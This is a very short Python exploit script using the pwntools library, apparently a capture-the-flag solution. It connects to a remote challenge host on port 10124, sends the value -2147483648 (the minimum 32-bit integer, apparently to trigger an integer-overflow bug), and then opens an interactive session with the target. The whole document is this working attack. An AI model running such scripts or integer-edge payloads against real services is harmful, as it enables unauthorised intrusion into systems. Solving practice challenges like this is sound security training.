from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10124)
io.sendline(b'-2147483648')
io.interactive()